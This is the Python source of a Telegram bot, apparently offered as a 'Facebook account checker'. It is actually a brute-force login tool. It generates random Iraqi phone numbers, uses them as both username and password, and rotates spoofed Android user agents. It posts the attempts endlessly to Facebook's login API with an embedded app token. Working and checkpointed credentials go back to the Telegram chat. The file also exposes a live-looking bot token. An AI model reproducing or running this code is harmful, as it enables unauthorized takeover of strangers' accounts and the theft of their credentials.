import requests
import  random
import sys
import telebot
from telebot import types
from concurrent.futures import ThreadPoolExecutor
User_Agent=[]

bot = telebot.TeleBot("6323782161:AAE6cdT7fPPB1oEhU9JW8kfQLipSYrfPbH0")
Devil1 = types.InlineKeyboardButton(text ="Click To Start ",callback_data = "anixh10")
Devil_2 = types.InlineKeyboardButton(text ="Programmer",url="t.me/anixh10")

@bot.message_handler(commands=["start"])
def start(message):
	photo = f"t.me/{message.from_user.username}"
	tag = f"[{message.from_user.first_name}]({photo})"
	text = f"*Hello* {tag}* To Bot Check Acc Facebook  !*"
	Devilbut1 = types.InlineKeyboardMarkup()
	Devilbut1.add(Devil1)
	Devilbut1.add(Devil_2)
	bot.send_photo(message.chat.id,photo,text ,
 parse_mode="Markdown",reply_markup=Devilbut1)

@bot.callback_query_handler(lambda call:True)
def call(call): 
		if call.data == "anixh10":
			messag=bot.send_message(chat_id=call.message.chat.id,text=' *Send Your Name bro :*',parse_mode='Markdown')								
			bot.register_next_step_handler(messag,check,messag.id)						
			rr = random.randint
			andro=random.choice(['3.0','4.4.2','4.4.4','5.0.1','8.0','7.0','6.0','5.0','4.0','4.3.4','7.0.1','8.0.1','3','4','5','6','7','8','9','10','11','12','13'])
			rmx=random.choice(['Redmi 7','Redmi Note 8','Redmi 6A','Mi 9 Lite','Redmi Note 11 Pro','Redmi 5A','Mi 9 SE','POCO M4 Pro','POCO X3 Pro','Redmi 5 Plus','Redmi Note 10 Pro','M2007J22G','Redmi 9C NFC'])
			build=random.choice(['OPM1','TP1A','RP1A','PPR1','PKQ1','QP1A','SP1A','RKQ1'])
			vbuild=random.choice(['001','002','003','004','005','006','007','008','009','010','011','012','013','014','015','016','017','018','019','020'])
			mark=random.choice(['en-us','en-gb','id-id','de-de','ru-ru','en-sg','fr-fr','fa-ir','ja-jp','pt-br','cs-cz','zh-hk','zh-cn','vi-vn','en-ph','en-in','tr-tr'])
			aa_Devil=f'Mozilla/5.0 (Linux; Android {andro}; {rmx}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{str(rr(73,114))}.0.{str(rr(4200,4900))}.{str(rr(73,150))} Mobile Safari/537.36 XiaoMi/MiuiBrowser/17.6.280522 swan-mibrowser'
			bb_Devil=f'Mozilla/5.0 (Linux; U; Android {andro}; {rmx}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{str(rr(73,114))}.0.{str(rr(4200,4900))}.{str(rr(73,150))} Mobile Safari/537.36 XiaoMi/MiuiBrowser/17.6.280522 swan-mibrowser'
			cc_Devil=f'Mozilla/5.0 (Linux; Android {andro}; {mark}; {rmx}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{str(rr(73,114))}.0.{str(rr(4200,4900))}.{str(rr(73,150))} Mobile Safari/537.36 XiaoMi/MiuiBrowser/17.6.280522 swan-mibrowser'
			dd_Devil=f'Mozilla/5.0 (Linux; U; Android {andro}; {mark}; {rmx}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{str(rr(73,114))}.0.{str(rr(4200,4900))}.{str(rr(73,150))} Mobile Safari/537.36 XiaoMi/MiuiBrowser/17.6.280522 swan-mibrowser'
			ee_Devil=f'Mozilla/5.0 (Linux; Android {andro}; {rmx} Build/{build}.{str(rr(100000,250000))}.{vbuild}; wv) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{str(rr(73,114))}.0.{str(rr(4200,4900))}.{str(rr(73,150))} Mobile Safari/537.36 XiaoMi/MiuiBrowser/17.6.280522 swan-mibrowser'
			ff_Devil=f'Mozilla/5.0 (Linux; U; Android {andro}; {rmx} Build/{build}.{str(rr(100000,250000))}.{vbuild}; wv) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{str(rr(73,114))}.0.{str(rr(4200,4900))}.{str(rr(73,150))} Mobile Safari/537.36 XiaoMi/MiuiBrowser/17.6.280522 swan-mibrowser'
			gg_Devil=f'Mozilla/5.0 (Linux; Android {andro}; {mark}; {rmx} Build/{build}.{str(rr(100000,250000))}.{vbuild}; wv) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{str(rr(73,114))}.0.{str(rr(4200,4900))}.{str(rr(73,150))} Mobile Safari/537.36 XiaoMi/MiuiBrowser/17.6.280522 swan-mibrowser'
			hh_Devil=f'Mozilla/5.0 (Linux; U; Android {andro}; {mark}; {rmx} Build/{build}.{str(rr(100000,250000))}.{vbuild}; wv) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{str(rr(73,114))}.0.{str(rr(4200,4900))}.{str(rr(73,150))} Mobile Safari/537.36 XiaoMi/MiuiBrowser/17.6.280522 swan-mibrowser'
			ii_Devil=f'Mozilla/5.0 (Linux; Android {andro}; {rmx}) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{str(rr(73,114))}.0.{str(rr(4200,4900))}.{str(rr(73,150))} Mobile Safari/537.36 XiaoMi/MiuiBrowser/17.6.280522 swan-mibrowser'
			jj_Devil=f'Mozilla/5.0 (Linux; U; Android {andro}; {rmx}) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{str(rr(73,114))}.0.{str(rr(4200,4900))}.{str(rr(73,150))} Mobile Safari/537.36 XiaoMi/MiuiBrowser/17.6.280522 swan-mibrowser'
			kk_Devil=f'Mozilla/5.0 (Linux; Android {andro}; {mark}; {rmx}) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{str(rr(73,114))}.0.{str(rr(4200,4900))}.{str(rr(73,150))} Mobile Safari/537.36 XiaoMi/MiuiBrowser/17.6.280522 swan-mibrowser'
			ll_Devil=f'Mozilla/5.0 (Linux; U; Android {andro}; {mark}; {rmx}) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{str(rr(73,114))}.0.{str(rr(4200,4900))}.{str(rr(73,150))} Mobile Safari/537.36 XiaoMi/MiuiBrowser/17.6.280522 swan-mibrowser'
			mm_Devil=f'Mozilla/5.0 (Linux; Android {andro}; {rmx} Build/{build}.{str(rr(100000,250000))}.{vbuild}; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{str(rr(73,114))}.0.{str(rr(4200,4900))}.{str(rr(73,150))} Mobile Safari/537.36 XiaoMi/MiuiBrowser/17.6.280522 swan-mibrowser'
			nn_Devil=f'Mozilla/5.0 (Linux; U; Android {andro}; {rmx} Build/{build}.{str(rr(100000,250000))}.{vbuild}; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{str(rr(73,114))}.0.{str(rr(4200,4900))}.{str(rr(73,150))} Mobile Safari/537.36 XiaoMi/MiuiBrowser/17.6.280522 swan-mibrowser'
			oo_Devil=f'Mozilla/5.0 (Linux; Android {andro}; {mark}; {rmx} Build/{build}.{str(rr(100000,250000))}.{vbuild}; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{str(rr(73,114))}.0.{str(rr(4200,4900))}.{str(rr(73,150))} Mobile Safari/537.36 XiaoMi/MiuiBrowser/17.6.280522 swan-mibrowser'
			pp_Devil=f'Mozilla/5.0 (Linux; U; Android {andro}; {mark}; {rmx} Build/{build}.{str(rr(100000,250000))}.{vbuild}; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{str(rr(73,114))}.0.{str(rr(4200,4900))}.{str(rr(73,150))} Mobile Safari/537.36 XiaoMi/MiuiBrowser/17.6.280522 swan-mibrowser'
			Usergen = random.choice([aa_Devil,bb_Devil,cc_Devil,dd_Devil,ee_Devil,ff_Devil,gg_Devil,hh_Devil,ii_Devil,jj_Devil,kk_Devil,ll_Devil,mm_Devil,nn_Devil,oo_Devil,pp_Devil])
			User_Agent.append(Usergen)
			
def check(message,id):
    OK =0
    CP =0
    ERORR=0
    while True:
    	g4q = random.choice(User_Agent)
    	Num = random.choice(["0770","0781","0771","0771","0772","0775","0773","0774","0782"])
    	user='1234567890'
    	Num2=''.join(random.choice(user) for i in range(7))
    	password = Num+Num2
    	ids = '+964'+Num+Num2
    	if password:
    	   sys.stdout.flush()
    	   data ={"locale": "en_GB","format": "json","email": ids,"password": password,"access_token":"438142079694454|fc0a7caa49b192f64f6f5a6d9643bb28","generate_session_cookies": 1}
    	   head = {'user-agent': g4q,'Host':'graph.facebook.com','Content-Type':'application/json;charset=utf-8','Content-Length':'595','Connection':'Keep-Alive','Accept-Encoding':'gzip'}
    	   po = requests.post("https://b-graph.facebook.com/auth/login",data=data,headers=head).json()
    	   if 'session_key' in po:
    	       OK+=1
    	       bot.send_message(message.chat.id,text=f'''
⋘─────━𓆩ANIXH𓆪‏━─────⋙
❖ - 𝐔𝐒𝐄𝐑𝐍𝐀𝐌 : {ids}
❖ - 𝐏𝐀𝐒𝐒𝐖𝐑𝐃 : {password}
<><><><><><><><><><><><><><>
⋘─────━𓆩∂єνιℓ νιρ𓆪‏━─────⋙
    	           	       ''')
    	   elif 'www.facebook.com' in po['error']['message']:
    	   	CP+=1
    	   	bot.send_message(message.chat.id,text=f'''
⋘─────━𓆩ANIXH𓆪‏━─────⋙
❖ - 𝐔𝐒𝐄𝐑𝐍𝐀𝐌 : {ids}
❖ - 𝐏𝐀𝐒𝐒𝐖𝐑𝐃 : {password}
<><><><><><><><><><><><><><>
⋘─────━𓆩ANIXH𓆪‏━─────⋙
    	           	       ''')
    	   else:
    	   	ERORR+=1           	       	   	
    	   	OK_CP_Check_Devil=types.InlineKeyboardButton(text=f"{ids} : {password}", callback_data="anixh")
    	   	OK1 =types.InlineKeyboardButton(text=f"OK : {OK}", callback_data="anixh")
    	   	CP1 =types.InlineKeyboardButton(text=f"CP : {CP}", callback_data="anixh")
    	   	ERORR1 =types.InlineKeyboardButton(text=f"NO : {ERORR}", callback_data="anixh")
    	   	Devilurl =types.InlineKeyboardButton(text="Programmer  ", url="t.me/anixh10")
    	   	Devilbut2 = types.InlineKeyboardMarkup(row_width=2)
    	   	Devilbut2 = types.InlineKeyboardMarkup()
    	   	Devilbut2.add(OK_CP_Check_Devil)
    	   	Devilbut2.add(OK1)
    	   	Devilbut2.add(CP1,ERORR1)
    	   	Devilbut2.add(Devilurl)
    	   	bot.edit_message_text(chat_id=message.chat.id,message_id=id,text="""
* Checking Acc Working Good Luck Bro !*
""",parse_mode="markdown",disable_web_page_preview=True,reply_markup=Devilbut2)
executor = ThreadPoolExecutor(max_workers=100)
executor.submit(check) 
bot.infinity_polling()	